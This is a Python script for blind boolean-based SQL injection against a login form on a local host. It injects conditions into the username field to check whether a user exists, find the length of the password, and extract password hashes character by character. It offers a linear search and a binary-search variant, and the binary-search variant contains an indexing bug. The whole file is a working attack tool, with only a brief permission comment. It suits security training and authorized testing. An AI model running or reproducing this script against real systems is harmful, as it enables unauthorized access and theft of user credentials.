#!/bin/python3

import requests

HOST = "http://127.0.0.1" #Target Host. Only use this on targets you have permission to try this on
PORT = "8080" #Target Port

queries = 0
charset = "0123456789abcdef"
success_string = "Welcome back"
failure_string = "Incorrect"

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://www.google.com/',
    'Content-Type': 'application/x-www-form-urlencoded'
}

def injected_query(payload):
	global queries
	r = requests.post(f"{HOST}:{PORT}", data={"username":f"admin' and {payload}--","password":"password"}, headers=headers)
	queries += 1
	return success_string.encode() not in r.content
	#Replace the line above with the line below if you want to test for failure string instead
	#return failure_string.encode() in r.content

def boolean_query(offset, user_id, character, operator=">"):
	payload = f"(select hex(substr(password,{offset+1},1)) from user where id = {user_id}) {operator} hex('{character}')"
	return injected_query(payload)

def invalid_user(user_id):
	payload = f"(select id from user where id = {user_id}) >= 0"
	return injected_query(payload)

def password_length(user_id):
	i = 0
	while True:
		payload = f"(select length(password) from user where id = {user_id} and length(password) <= {i} limit 1)"
		if not injected_query(payload):
			return i
		i += 1

def extract_hash(charset, user_id, password_length):
	found = ""
	for i in range(0, password_length):
		for j in range(len(charset)):
			if boolean_query(i, user_id, charset[j]):
				found += charset[j]
				break
	return found

def extract_hash_bst(charset, user_id, password_length):
	found = ""
	for index in range(0, password_length):
		start = 0
		end = len(charset) - 1
		while start <= end:
			if end - start == 1:
				if start == 0 and boolean_query(index, user_id, charset[start]):
					found += charset[start]
				else:
					found += charset[start + 1]
				break
			else:
				middle = (end + start) / 2
				if boolean_query(index, user_id, charset[middle]):
					end = middle
				else:
					start = middle
	return found

def total_queries_taken():
	global queries
	print(f"\t\t[!] {queries} total queries")
	queries = 0

while True:
	try:
		user_id = input("> Enter a user ID to extraxt password hash: ")
		if not invalid_user(user_id):
			user_pw_length = password_length(user_id)
			print(f"\t[-] User {user_id} has length {user_pw_length}")
			total_queries_taken()
			print(f"\t[-] User {user_id} password hash is {extract_hash(charset, int(user_id), user_pw_length)}")
			total_queries_taken()
			print(f"\t[-] User {user_id} password hash is {extract_hash_bst(charset, int(user_id), user_pw_length)}")
			total_queries_taken()

		else:
			print(f"\t[X] User {user_id} does not exist!")
	except KeyboardInterrupt:
		break